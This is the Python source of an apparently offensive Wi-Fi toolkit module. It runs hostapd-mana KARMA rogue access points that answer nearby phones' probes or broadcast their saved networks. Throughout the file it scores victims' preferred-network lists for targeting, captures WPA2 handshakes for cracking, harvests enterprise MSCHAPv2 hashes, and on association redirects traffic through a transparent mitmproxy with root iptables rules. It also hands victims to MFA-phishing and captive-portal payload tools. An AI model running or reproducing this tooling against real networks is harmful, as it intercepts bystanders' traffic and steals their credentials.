"""KARMA / MANA -- respond "yes, I'm that network" to every probe.

Wrapper around ``hostapd-mana`` with the four modes the 2025 mobile-
hacker research recommends, on-associate hooks that hand off to the
sibling modules (mitmproxy, wifipumpkin3, phishkin3, iot_recon,
eaphammer), and a smart-triage panel that scores the PNL entries
harvested by ``probe_harvester``.

Modes:

* **Loud** -- the classic ``mana_loud=1``. Responds to every probe
  and re-broadcasts every seen SSID as a fake beacon. Maximum
  reach, maximum noise, easy to detect by any WIDS in range.

* **Selective / Silent** -- ``mana_loud=0`` + ``mana_ssidfilter_file``
  with an operator-picked allowlist. Only responds to probes for the
  SSIDs in the file. Quiet and precise; the mode you want for a
  specific target.

* **Targeted-MAC** -- Selective + ``accept_mac_file``. Only accepts
  associations from a small set of client MACs. Removes the
  "every phone in the coffee shop" collateral.

* **Beacon-only** -- no probe responses at all; instead we spin
  hostapd up with N BSSes, each broadcasting one SSID from the
  operator-picked allowlist. This is the only mode that still
  catches iOS 14+ / Android 10+ devices that stopped emitting
  directed probes for saved Open networks -- they auto-join
  when they *see* the beacon.

On-associate hooks (each is a switch, default OFF):

* Start ``mitmproxy --mode transparent`` when the first client
  associates. Flow file lands in loot.
* Hand off to wifipumpkin3 for captive-portal + payload delivery
  (deep-link with ``karma_takeover:<ssid>:<iface>:<channel>``).
* Hand off to phishkin3 (evilginx3) for MFA phishing keyed by SSID.
* Hand off to iot_recon if the associated client's OUI matches a
  known IoT vendor.
* Hand off to eaphammer if the harvested PNL contains an
  enterprise-shaped SSID before the AP even starts.

The rest of the file is the config-template + parser + Gtk plumbing
that wires all of that together.
"""
from __future__ import annotations

import base64
import os
import re
import time
from pathlib import Path

from gi.repository import Adw, GLib, Gtk

from ..executor import Process, Result, run_async
from ..loot_store import get_loot_store, loot_path
from ..module import NHModule, register
from ..widgets import OutputView, toast

DEFAULT_IFACE = "wlan1"

# Corporate-shape hints: SSIDs that suggest 802.1X. Used by the
# triage panel to flag "this SSID probably wants EAPHammer".
_ENTERPRISE_HINTS = (
    "eduroam", "-corp", "-emp", "-employee", "corporate",
    "enterprise", "wpa2-enterprise", "-1x",
)

# IoT-vendor prefixes -- probes for these are almost always
# unpatched IoT devices with the vendor's setup SSID stuck in the
# PNL. When one shows up in the harvest, iot_recon is the right
# next step.
_IOT_HINTS = (
    "smartlife_", "tp-link_", "hs100_", "hs110_", "wemo.",
    "chromecast", "wyze_", "roomba-", "shelly", "tasmota",
    "esp-", "esphome", "sonoff", "amazon-", "ring_", "reolink-",
)

# Noise-blocklist: SSIDs that get typed by a hundred vendor defaults.
# Rarely the target's real home network, and if it is, the score
# still surfaces it via the entropy heuristic.
_NOISE_SSIDS = {
    "linksys", "netgear", "xfinitywifi", "attwifi", "free wi-fi",
    "free wifi", "guest", "welcome", "starbucks wifi",
    "iphone", "android", "hotspot", "androidap", "belkin",
    "dlink", "d-link", "public wifi",
}


# hostapd-mana lines. Version-independent regexes; hostapd-mana
# 2.6 and 2.12 print slightly different phrasing.
_PROBE_RE = re.compile(
    r"probe request.*?from\s+([0-9a-f:]{17}).*?"
    r"(?:for(?: SSID)?|SSID:|SSID=)\s*['\"]?([^'\"\r\n]+?)['\"]?\s*$",
    re.IGNORECASE)
_ASSOC_RE = re.compile(
    r"(?:AP-STA-CONNECTED|associated.*?from)\s+([0-9a-f:]{17})",
    re.IGNORECASE)


# hostapd-mana config template. The three ``{...}`` slots are the
# mode-dependent bits: security block, mana knobs, and any WPE
# / capture output paths.
_HOSTAPD_MANA_TMPL = """interface={iface}
driver=nl80211
ssid={ssid}
hw_mode={hw_mode}
channel={channel}
country_code={country}
auth_algs=1
{security_lines}
mana_wifi=1
{mana_lines}
"""


def _shannon(text: str) -> float:
    """Very cheap Shannon entropy per character. Used by the triage
    scorer to distinguish 'MyHome_5G' (high entropy, unique) from
    'guest' (low entropy, ambient)."""
    if not text:
        return 0.0
    from math import log2
    counts: dict[str, int] = {}
    for c in text.lower():
        counts[c] = counts.get(c, 0) + 1
    n = len(text)
    return -sum((c / n) * log2(c / n) for c in counts.values())


def _score_ssid(ssid: str, hits: int, distinct_clients: int) -> tuple[int, str]:
    """Return ``(score, chain_hint)`` for a candidate SSID.

    ``chain_hint`` is a plain string that maps to the follow-up
    module: ``karma_open`` / ``evil_twin_psk`` / ``eaphammer`` /
    ``iot_recon``.
    """
    low = ssid.lower()
    # Chain hints -- these dominate the routing decision even
    # when the score is medium.
    if any(h in low for h in _ENTERPRISE_HINTS):
        return (5 + hits, "eaphammer")
    if any(low.startswith(h) for h in _IOT_HINTS):
        return (6 + hits, "iot_recon")

    score = 0
    if low in _NOISE_SSIDS:
        score -= 5
    else:
        score += 3  # baseline for named SSIDs
        # Entropy: SSIDs like 'Wifi_Perez_9x2Gh1' win over 'guest'.
        e = _shannon(ssid)
        if e > 3.5:
            score += 3
        elif e > 2.5:
            score += 1
        # Bonus for insistence (device really wants this SSID) and
        # popularity (multiple clients probe it, chances of a hit
        # go up as we approach neighbours).
        score += min(hits, 10)
        score += min(distinct_clients, 5)
        # Names that scream "guest / welcome / hotel wifi" are
        # usually Open; +1 because Karma-Open is the only mode that
        # still catches iOS/Android modern.
        for kw in ("guest", "welcome", "wifi", "hotel", "public"):
            if kw in low:
                score += 1
                break
    return (score, "karma_open")


@register
class Karma(NHModule):
    title = "KARMA responder"
    icon = "network-wireless-hotspot-symbolic"
    description = ("Loud / selective / beacon-only karma with "
                   "on-associate handoffs to mitmproxy, "
                   "wifipumpkin3, phishkin3, iot_recon, eaphammer.")
    required_tools = ["hostapd-mana"]

    def __init__(self, app_window):
        super().__init__(app_window)
        self._proc: Process | None = None
        self._mitm_proc: Process | None = None
        # ssid -> {"count": n, "clients": set(MAC), "last_seen": ts}
        self._probes: dict[str, dict] = {}
        self._client_macs: set[str] = set()
        self._assoc_count = 0
        self._first_client_seen = False
        self._pnl_rows: list[Adw.ActionRow] = []
        self._triage_rows: list[Adw.ActionRow] = []
        self._loot_id: int | None = None

    # ------------------------------------------------------------ build
    def build(self) -> Gtk.Widget:
        box = Gtk.Box(orientation=Gtk.Orientation.VERTICAL, spacing=12)
        for m in ("top", "bottom", "start", "end"):
            getattr(box, "set_margin_" + m)(12)

        # ------------------------------- mode
        mode_group = Adw.PreferencesGroup(
            title="Karma mode",
            description="Loud is the classic mana behaviour; "
                        "Selective / Beacon-only are the modes that "
                        "still work against modern phones.")
        self.mode = Adw.ComboRow(title="Mode")
        self.mode.set_model(Gtk.StringList.new([
            "Selective (allowlist, quiet)",
            "Loud (respond to every probe)",
            "Targeted-MAC (allowlist + MAC filter)",
            "Beacon-only (broadcast the allowlist as beacons)",
        ]))
        mode_group.add(self.mode)

        self.ssid_allowlist = Adw.EntryRow(
            title="SSID allowlist (comma-separated)")
        self.ssid_allowlist.set_text("")
        mode_group.add(self.ssid_allowlist)

        self.mac_allowlist = Adw.EntryRow(
            title="Client MAC allowlist (comma-separated)")
        mode_group.add(self.mac_allowlist)

        import_row = Adw.ActionRow(
            title="Import allowlist from Probe Harvester",
            subtitle="Reads probes CSV files under ~/loot/probes/")
        import_btn = Gtk.Button(label="Import",
                                valign=Gtk.Align.CENTER)
        import_btn.connect(
            "clicked", lambda _b: self._import_from_harvester())
        import_row.add_suffix(import_btn)
        mode_group.add(import_row)
        box.append(mode_group)

        # ------------------------------- AP config
        cfg_group = Adw.PreferencesGroup(title="AP config")
        self.iface = Adw.EntryRow(title="AP interface")
        self.iface.set_text(DEFAULT_IFACE)
        cfg_group.add(self.iface)

        self.ssid = Adw.EntryRow(title="Base ESSID (fallback)")
        self.ssid.set_text("Free Wi-Fi")
        cfg_group.add(self.ssid)

        self.band = Adw.ComboRow(title="Band + channel")
        self.band.set_model(Gtk.StringList.new([
            "2.4 GHz · ch 1",
            "2.4 GHz · ch 6",
            "2.4 GHz · ch 11",
            "5 GHz · ch 36",
            "5 GHz · ch 44",
            "5 GHz · ch 149",
        ]))
        cfg_group.add(self.band)

        self.country = Adw.EntryRow(title="Country (regdomain)")
        self.country.set_text("US")
        cfg_group.add(self.country)

        self.eap_mode = Adw.ComboRow(title="Auth")
        self.eap_mode.set_model(Gtk.StringList.new([
            "Open (accept any client, MITM upstream)",
            "WPA2-PSK (attract clients expecting encryption)",
            "WPA2-Enterprise EAP-WPE (harvest MSCHAPv2 hashes)",
        ]))
        cfg_group.add(self.eap_mode)

        self.mode_psk = Adw.PasswordEntryRow(
            title="PSK (WPA2 mode)")
        self.mode_psk.set_text("welcome123")
        cfg_group.add(self.mode_psk)

        self.capture_handshakes = Adw.SwitchRow(
            title="Capture handshakes",
            subtitle="mana_wpaout pcap for offline crack "
                     "(WPA2 mode only)")
        self.capture_handshakes.set_active(True)
        cfg_group.add(self.capture_handshakes)

        run_row = Adw.ActionRow(
            title="Start / Stop KARMA",
            subtitle="Live probe log below")
        self.start_btn = Gtk.Button(label="Start",
                                    valign=Gtk.Align.CENTER)
        self.start_btn.add_css_class("suggested-action")
        self.start_btn.connect("clicked", lambda _b: self._start())
        run_row.add_suffix(self.start_btn)
        self.stop_btn = Gtk.Button(label="Stop",
                                   valign=Gtk.Align.CENTER)
        self.stop_btn.set_sensitive(False)
        self.stop_btn.connect("clicked", lambda _b: self._stop())
        run_row.add_suffix(self.stop_btn)
        cfg_group.add(run_row)
        box.append(cfg_group)

        # ------------------------------- on-associate hooks
        hooks = Adw.PreferencesGroup(
            title="On client associate",
            description="Fire once, when the first client joins us.")
        self.hook_mitm = Adw.SwitchRow(
            title="Start mitmproxy transparent",
            subtitle="Redirect :80/:443 to :8080; flow file to loot")
        hooks.add(self.hook_mitm)
        self.hook_wifipumpkin = Adw.SwitchRow(
            title="Hand off to wifipumpkin3",
            subtitle="Stop mana AP and take over with a captive "
                     "portal-capable AP")
        hooks.add(self.hook_wifipumpkin)
        self.hook_phishkin = Adw.SwitchRow(
            title="Open phishkin3",
            subtitle="MFA relay portal keyed by SSID brand hint")
        hooks.add(self.hook_phishkin)
        self.hook_iotrecon = Adw.SwitchRow(
            title="Open iot_recon if client OUI matches IoT",
            subtitle="Chained cloud MITM for smart-home devices")
        hooks.add(self.hook_iotrecon)
        self.hook_eaphammer = Adw.SwitchRow(
            title="Open eaphammer if PNL contains enterprise SSID",
            subtitle="MSCHAPv2 harvest via GTC downgrade")
        hooks.add(self.hook_eaphammer)
        box.append(hooks)

        # ------------------------------- stats
        stat_group = Adw.PreferencesGroup(title="Session")
        self.state_row = Adw.ActionRow(
            title="Status", subtitle="idle")
        stat_group.add(self.state_row)
        self.probe_count_row = Adw.ActionRow(
            title="Unique probes seen", subtitle="0")
        stat_group.add(self.probe_count_row)
        self.client_count_row = Adw.ActionRow(
            title="Unique clients heard", subtitle="0")
        stat_group.add(self.client_count_row)
        self.assoc_count_row = Adw.ActionRow(
            title="Clients that associated", subtitle="0")
        stat_group.add(self.assoc_count_row)
        box.append(stat_group)

        # ------------------------------- triage
        self._triage_group = Adw.PreferencesGroup(
            title="Recommended targets",
            description="Top-scored SSIDs from the current PNL "
                        "harvest; chain hint on the right.")
        self._triage_empty = Adw.ActionRow(
            title="Nothing to triage yet",
            subtitle="Probes will trickle in once we go live")
        self._triage_group.add(self._triage_empty)
        box.append(self._triage_group)

        # ------------------------------- PNL harvested
        pnl_group = Adw.PreferencesGroup(
            title="Networks in clients' PNL",
            description="Every SSID we saw probed. Click 'Karma this' "
                        "to add to the selective allowlist and "
                        "restart the AP.")
        self._pnl_group = pnl_group
        self._pnl_empty = Adw.ActionRow(
            title="Waiting for probes…",
            subtitle="Start Karma and wait for clients")
        pnl_group.add(self._pnl_empty)
        box.append(pnl_group)

        # ------------------------------- output
        self.output = OutputView()
        box.append(self.output)
        return box

    # ------------------------------------------------------ start / stop
    def _start(self) -> None:
        if self._proc is not None and self._proc.running:
            return
        iface = self.iface.get_text().strip() or DEFAULT_IFACE
        base_ssid = self.ssid.get_text().strip() or "Free Wi-Fi"
        # Parse channel from combo row.
        band_ch = [
            ("g", "1"), ("g", "6"), ("g", "11"),
            ("a", "36"), ("a", "44"), ("a", "149"),
        ][self.band.get_selected()]
        hw_mode, channel = band_ch
        country = self.country.get_text().strip() or "US"

        # Split the allowlist.
        allow_ssids = [s.strip() for s in
                        self.ssid_allowlist.get_text().split(",")
                        if s.strip()]
        allow_macs = [m.strip().lower() for m in
                       self.mac_allowlist.get_text().split(",")
                       if m.strip()]

        stamp = time.strftime("%Y%m%d-%H%M%S")
        pcap: str | None = None
        security_lines = ""
        eap_idx = self.eap_mode.get_selected()
        if eap_idx == 1:
            # WPA2-PSK
            psk = self.mode_psk.get_text()
            if len(psk) < 8:
                psk = (psk + "!!!!!!!!")[:16]
            security_lines = (
                "wpa=2\n"
                "wpa_passphrase=%s\n"
                "wpa_key_mgmt=WPA-PSK\n"
                "wpa_pairwise=CCMP\n"
                "rsn_pairwise=CCMP\n") % psk
            if self.capture_handshakes.get_active():
                pcap = loot_path(
                    "karma", "karma-mana-%s.pcap" % stamp)
        elif eap_idx == 2:
            # WPA2-Enterprise (EAP-WPE).  Writes creds to
            # hostapd-mana's mana_credout file; user is expected to
            # move to eaphammer for the heavier variants (GTC
            # downgrade, ESSID stripping).
            security_lines = (
                "wpa=2\n"
                "wpa_key_mgmt=WPA-EAP\n"
                "wpa_pairwise=CCMP\n"
                "ieee8021x=1\n"
                "eap_server=1\n"
                "eap_user_file=/etc/hostapd-mana/hostapd.eap_user\n"
                "ca_cert=/etc/hostapd-mana/certs/ca.pem\n"
                "server_cert=/etc/hostapd-mana/certs/server.pem\n"
                "private_key=/etc/hostapd-mana/certs/server.key\n")

        # Mode-specific mana lines.
        mode_idx = self.mode.get_selected()
        mode_names = ["selective", "loud",
                      "targeted_mac", "beacon_only"]
        mode_name = mode_names[mode_idx]

        mana_parts = ["mana_macacl=0"]
        if mode_idx == 1:  # loud
            mana_parts.append("mana_loud=1")
        else:
            mana_parts.append("mana_loud=0")
            if allow_ssids:
                filt = "/tmp/nhp-karma-ssidfilter.txt"
                self._write_file(filt, "\n".join(allow_ssids) + "\n")
                mana_parts.append(
                    "mana_ssidfilter_file=%s" % filt)
            if mode_idx == 2 and allow_macs:
                mfilt = "/tmp/nhp-karma-macallow.txt"
                self._write_file(mfilt, "\n".join(allow_macs) + "\n")
                mana_parts += [
                    "mana_macacl=1",
                    "accept_mac_file=" + mfilt,
                ]
        if pcap:
            mana_parts.append("mana_wpaout=" + pcap)

        # Beacon-only mode uses a completely different hostapd
        # layout: N BSSes each broadcasting one allowlist SSID.
        if mode_idx == 3:
            cfg = self._beacon_only_config(
                iface, allow_ssids or [base_ssid],
                channel, hw_mode, country)
        else:
            cfg = _HOSTAPD_MANA_TMPL.format(
                iface=iface, ssid=base_ssid,
                hw_mode=hw_mode, channel=channel,
                country=country,
                security_lines=security_lines,
                mana_lines="\n".join(mana_parts))

        conf = "/tmp/nhp-karma.conf"
        self._write_file(conf, cfg)

        log_path = loot_path(
            "karma", "karma-log-%s.log" % stamp)

        argv = ["hostapd-mana", "-K", conf]
        self.output.append("$ " + " ".join(argv) + "\n")
        self.output.append("--- mode: " + mode_name + " ---\n"
                            + cfg + "---\n")

        # Reset session state.
        self._probes = {}
        self._client_macs = set()
        self._assoc_count = 0
        self._first_client_seen = False
        self._render_pnl()
        self._render_triage()
        self.probe_count_row.set_subtitle("0")
        self.client_count_row.set_subtitle("0")
        self.assoc_count_row.set_subtitle("0")

        # Baseline loot rows.
        self._loot_id = get_loot_store().record(
            module="karma", type="karma_log",
            target=base_ssid + " (" + mode_name + ")",
            path=log_path,
            notes="KARMA session; mode=" + mode_name)
        if pcap:
            get_loot_store().record(
                module="karma", type="handshake_pcap",
                target=base_ssid + " (mana WPA2)", path=pcap,
                notes="hostapd-mana captured handshakes")

        def on_line(text: str) -> None:
            self.output.append(text)
            try:
                with open(log_path, "a") as fp:
                    fp.write(text)
            except OSError:
                pass
            self._parse_stream(text)

        def on_done(code: int) -> None:
            self.output.append("[hostapd-mana exited: %d]\n" % code)
            self._proc = None
            self.start_btn.set_sensitive(True)
            self.stop_btn.set_sensitive(False)
            self.state_row.set_subtitle("stopped")
            if self._loot_id is not None:
                get_loot_store().refresh_size(self._loot_id)
            self._teardown_mitm()

        self._proc = Process(
            argv, on_line, on_done, root=True)
        self._proc.start()
        self.start_btn.set_sensitive(False)
        self.stop_btn.set_sensitive(True)
        self.state_row.set_subtitle("running (%s)" % mode_name)
        GLib.timeout_add_seconds(3, self._refresh_ui)

        # Preflight enterprise hint: if the operator asked us to
        # hand off to eaphammer *only* when the harvest contains an
        # enterprise SSID, we defer that check until we have
        # something in the PNL. But if the operator already put an
        # enterprise-shaped SSID in the allowlist we can jump now.
        if self.hook_eaphammer.get_active():
            for s in allow_ssids:
                if any(h in s.lower() for h in _ENTERPRISE_HINTS):
                    toast(self.app_window,
                          "SSID " + s + " smells enterprise; "
                          "eaphammer is probably a better fit.")
                    break

    def _stop(self) -> None:
        if self._proc is not None:
            self._proc.stop()
        self.stop_btn.set_sensitive(False)
        self.state_row.set_subtitle("stopping…")

    # ------------------------------------------------------ parsers
    def _parse_stream(self, text: str) -> None:
        for line in (text or "").splitlines():
            m = _PROBE_RE.search(line)
            if m:
                mac = m.group(1).lower()
                ssid_v = m.group(2)[:32]
                if ssid_v and ssid_v != "\\x00":
                    d = self._probes.setdefault(
                        ssid_v, {"count": 0, "clients": set(),
                                 "last_seen": time.time()})
                    d["count"] += 1
                    d["clients"].add(mac)
                    d["last_seen"] = time.time()
                    self._client_macs.add(mac)
                continue
            a = _ASSOC_RE.search(line)
            if a:
                mac = a.group(1).lower()
                self._client_macs.add(mac)
                self._assoc_count += 1
                if not self._first_client_seen:
                    self._first_client_seen = True
                    self._fire_hooks(mac)

    def _refresh_ui(self) -> bool:
        if self._proc is None or not self._proc.running:
            return False
        self.probe_count_row.set_subtitle(str(len(self._probes)))
        self.client_count_row.set_subtitle(str(len(self._client_macs)))
        self.assoc_count_row.set_subtitle(str(self._assoc_count))
        self._render_pnl()
        self._render_triage()
        return True

    # ------------------------------------------------------ triage
    def _render_triage(self) -> None:
        for r in self._triage_rows:
            self._triage_group.remove(r)
        self._triage_rows = []
        if not self._probes:
            self._triage_empty.set_visible(True)
            return
        self._triage_empty.set_visible(False)
        scored = []
        for ssid, info in self._probes.items():
            score, hint = _score_ssid(
                ssid, info["count"], len(info["clients"]))
            scored.append((score, hint, ssid, info))
        scored.sort(key=lambda t: t[0], reverse=True)
        for score, hint, ssid, info in scored[:5]:
            row = Adw.ActionRow(
                title=ssid,
                subtitle="score %d · %s · %d probes · %d clients"
                        % (score, hint, info["count"],
                           len(info["clients"])))
            btn = Gtk.Button(label="Karma this",
                             valign=Gtk.Align.CENTER)
            btn.add_css_class("suggested-action")
            btn.connect(
                "clicked",
                lambda _b, s=ssid: self._karma_this(s))
            row.add_suffix(btn)
            chain_btn = Gtk.Button(label="Chain",
                                   valign=Gtk.Align.CENTER)
            chain_btn.set_tooltip_text(
                "Deep-link to the module suggested by the hint")
            chain_btn.connect(
                "clicked",
                lambda _b, s=ssid, h=hint:
                    self._chain_to(h, s))
            row.add_suffix(chain_btn)
            self._triage_group.add(row)
            self._triage_rows.append(row)

    def _karma_this(self, ssid: str) -> None:
        """Add SSID to the allowlist, switch to Selective mode, and
        restart hostapd-mana so the change takes effect immediately.
        """
        current = [s.strip() for s in
                    self.ssid_allowlist.get_text().split(",")
                    if s.strip()]
        if ssid not in current:
            current.append(ssid)
            self.ssid_allowlist.set_text(", ".join(current))
        self.mode.set_selected(0)  # Selective
        if self._proc is not None and self._proc.running:
            toast(self.app_window,
                  "Restart Karma for the allowlist change to apply")
        else:
            self._start()

    def _chain_to(self, hint: str, ssid: str) -> None:
        target = "karma:ssid=%s" % ssid
        if hint == "eaphammer":
            self.app_window.activate_module(
                "eaphammer", ssid + "||")
        elif hint == "iot_recon":
            self.app_window.activate_module("iot_recon", ssid)
        elif hint == "evil_twin_psk":
            self.app_window.activate_module(
                "evil_twin", ssid + "||")
        else:
            self.app_window.activate_module(
                "wifipumpkin", target)

    # ------------------------------------------------------ PNL list
    def _render_pnl(self) -> None:
        for r in self._pnl_rows:
            self._pnl_group.remove(r)
        self._pnl_rows = []
        self._pnl_empty.set_visible(len(self._probes) == 0)
        top = sorted(self._probes.items(),
                     key=lambda kv: kv[1]["count"], reverse=True)[:30]
        for ssid, info in top:
            row = Adw.ActionRow(
                title=ssid,
                subtitle="%d probes · %d client(s)"
                        % (info["count"], len(info["clients"])))
            btn = Gtk.Button(label="Clone in Evil Twin",
                             valign=Gtk.Align.CENTER)
            btn.connect(
                "clicked",
                lambda _b, s=ssid:
                    self.app_window.activate_module(
                        "evil_twin", s + "||"))
            row.add_suffix(btn)
            self._pnl_group.add(row)
            self._pnl_rows.append(row)

    # ------------------------------------------------- allowlist import
    def _import_from_harvester(self) -> None:
        """Fold the SSIDs from every probes CSV under ~/loot/probes/
        into the SSID allowlist. Cheap way to seed Selective mode
        from a prior recon pass."""
        probes_dir = Path.home() / "loot" / "probes"
        ssids: set[str] = set()
        try:
            for csvf in probes_dir.glob("probes-*.csv"):
                with open(csvf) as fp:
                    for line in fp:
                        parts = line.strip().split(",")
                        if len(parts) < 3:
                            continue
                        s = parts[2]
                        if s and s != "ssid" and len(s) <= 32:
                            ssids.add(s)
        except OSError:
            pass
        if not ssids:
            toast(self.app_window,
                  "No probes CSV found under ~/loot/probes/")
            return
        current = [s.strip() for s in
                    self.ssid_allowlist.get_text().split(",")
                    if s.strip()]
        combined = sorted(set(current) | ssids)
        self.ssid_allowlist.set_text(", ".join(combined))
        toast(self.app_window,
              "Imported %d SSIDs" % len(ssids))

    # ------------------------------------------------- on-associate hooks
    def _fire_hooks(self, client_mac: str) -> None:
        """First client just associated. Fire the enabled hooks in
        order of least-invasive first."""
        self.output.append("[first client associated: %s]\n"
                            % client_mac)

        if self.hook_mitm.get_active():
            self._start_mitm()

        if self.hook_iotrecon.get_active():
            oui = client_mac.upper()[:8]
            # A very small IoT OUI list; the full one lives in
            # iot_recon. If it matches, hop over.
            iot_ouis = {
                "F4:F5:D8", "54:60:09",  # Google/Chromecast
                "94:EB:2C", "74:C2:46",  # Amazon Echo
                "38:8B:59",              # TP-Link Kasa
                "94:E3:6D", "2C:AA:8E",  # Wyze
            }
            if oui in iot_ouis:
                self.output.append(
                    "[client OUI %s matches IoT vendor; "
                    "handing off to iot_recon]\n" % oui)
                self.app_window.activate_module("iot_recon", "")

        if self.hook_phishkin.get_active():
            self.app_window.activate_module(
                "phishkin3",
                self.ssid.get_text().strip() + "||")

        if self.hook_wifipumpkin.get_active():
            iface = self.iface.get_text().strip() or DEFAULT_IFACE
            self.output.append(
                "[handing off AP control to wifipumpkin3]\n")
            self._stop()
            self.app_window.activate_module(
                "wifipumpkin",
                "karma_takeover:%s:%s"
                % (self.ssid.get_text().strip(), iface))

    # ------------------------------------------------- mitmproxy hook
    def _start_mitm(self) -> None:
        if self._mitm_proc is not None:
            return
        iface = self.iface.get_text().strip() or DEFAULT_IFACE
        stamp = time.strftime("%Y%m%d-%H%M%S")
        flow_path = loot_path(
            "karma", "karma-mitm-%s.flows" % stamp)
        get_loot_store().record(
            module="karma", type="mitm_flows",
            target="karma associate", path=flow_path,
            notes="transparent mitmproxy on :8080")
        # Enable IP forwarding + REDIRECT :80/:443 to :8080; kill on
        # teardown.
        pre = (
            "sysctl -w net.ipv4.ip_forward=1; "
            "iptables -t nat -A PREROUTING -i %s -p tcp "
            "  --dport 80 -j REDIRECT --to-port 8080; "
            "iptables -t nat -A PREROUTING -i %s -p tcp "
            "  --dport 443 -j REDIRECT --to-port 8080"
        ) % (iface, iface)
        run_async(["sh", "-c", pre], lambda _r: None,
                  root=True, timeout=8)
        argv = ["mitmproxy", "--mode", "transparent",
                "--set", "block_global=false", "-w", flow_path]
        self.output.append("$ " + " ".join(argv) + "\n")
        self._mitm_proc = Process(
            argv, self.output.append,
            lambda _c: None, root=True)
        self._mitm_proc.start()

    def _teardown_mitm(self) -> None:
        if self._mitm_proc is None:
            return
        try:
            self._mitm_proc.stop()
        except Exception:
            pass
        self._mitm_proc = None
        # Best-effort iptables cleanup.
        run_async(
            ["sh", "-c",
             "iptables -t nat -F PREROUTING || true"],
            lambda _r: None, root=True, timeout=5)

    # ------------------------------------------------- beacon-only cfg
    def _beacon_only_config(self, iface: str, ssids: list[str],
                            channel: str, hw_mode: str,
                            country: str) -> str:
        """Build a hostapd config with N BSSes (one per SSID). Most
        Wi-Fi chips cap this at 4 -- we truncate silently.

        Beacon-only means we never respond to probes. The trick is
        that modern phones auto-join saved Open networks when they
        *see* the beacon, without having probed for them. So we
        simply broadcast the SSIDs and wait."""
        head = (
            "interface={iface}\n"
            "driver=nl80211\n"
            "hw_mode={hw_mode}\n"
            "channel={channel}\n"
            "country_code={country}\n"
            "auth_algs=1\n"
            "mana_wifi=0\n"          # no probe responses
            "beacon_int=100\n"
            "ssid={primary}\n"
        ).format(iface=iface, hw_mode=hw_mode, channel=channel,
                 country=country, primary=ssids[0])
        # Additional BSSes: bss=wlan1_1 etc. Cap at 4 by hardware.
        extras = ""
        for i, s in enumerate(ssids[1:4], start=1):
            extras += (
                "bss={iface}_{i}\n"
                "ssid={ssid}\n"
                "auth_algs=1\n"
            ).format(iface=iface, i=i, ssid=s)
        return head + extras

    # ------------------------------------------------- little helpers
    def _write_file(self, path: str, content: str) -> None:
        """Write a small config file as root. base64-piped so we
        don't fight shell quoting for hostapd config bodies."""
        b64 = base64.b64encode(content.encode()).decode()
        script = "printf '%s' | base64 -d > %s" % (b64, path)
        run_async(["sh", "-c", script],
                  lambda _r: None, root=True, timeout=5)

    # ------------------------------------------------- deep-link in
    def set_target(self, target: str) -> None:
        """Accepts:

          * ``<ssid>``  -- bare SSID → seed the allowlist.
          * ``karma:ssid=<ssid>,mode=<mode>,channel=<n>,...``
        """
        if not target:
            return
        if ":" not in target and "=" not in target:
            self.ssid_allowlist.set_text(target)
            self.mode.set_selected(0)
            return
        # kv parser
        payload = target.split(":", 1)[-1]
        kv = {}
        for pair in payload.split(","):
            if "=" not in pair:
                continue
            k, v = pair.split("=", 1)
            kv[k.strip()] = v.strip()
        if "ssid" in kv:
            self.ssid_allowlist.set_text(kv["ssid"])
        if kv.get("mode") == "loud":
            self.mode.set_selected(1)
        elif kv.get("mode") == "beacon":
            self.mode.set_selected(3)
        elif kv.get("mode") == "targeted":
            self.mode.set_selected(2)
        else:
            self.mode.set_selected(0)
        if "channel" in kv:
            try:
                ch = int(kv["channel"])
                mapping = {1: 0, 6: 1, 11: 2,
                           36: 3, 44: 4, 149: 5}
                self.band.set_selected(mapping.get(ch, 1))
            except ValueError:
                pass
